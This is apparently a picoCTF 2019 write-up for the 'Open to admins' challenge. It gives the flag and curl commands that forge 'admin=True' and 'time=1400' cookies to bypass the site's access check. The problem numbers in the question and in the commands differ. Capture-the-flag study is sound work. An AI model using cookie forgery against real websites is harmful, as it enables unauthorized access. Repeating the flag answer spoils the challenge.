# Open to admins

Q) This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. https://2019shell1.picoctf.com/problem/37878/ (link) or http://2019shell1.picoctf.com:37878

A) picoCTF{0p3n_t0_adm1n5_dcb566bb}

Commentary:

We can easily send a cookie to the website by using curl in the terminal with the apropriate flags:

```
curl "https://2019shell1.picoctf.com/problem/12276/flag" -H "Cookie: time=1400; admin=True;" -s
```

Since it is a simple and small HTML page that is being returned, we can find the flag just by reading it.
But if, for some reason, it was a very large HTML file, 
we could use grep to get the flag, by piping the response into grep, like this:

```
curl "https://2019shell1.picoctf.com/problem/12276/flag" -H "Cookie: time=1400; admin=True;" -s | grep picoCTF
```
The -H flag defines a custom header line, which we want, since we want to tell the server we are both Admin, and the time is 1400.

This leaves us with the flag, which is:

```
picoCTF{0p3n_t0_adm1n5_dcb566bb}
```
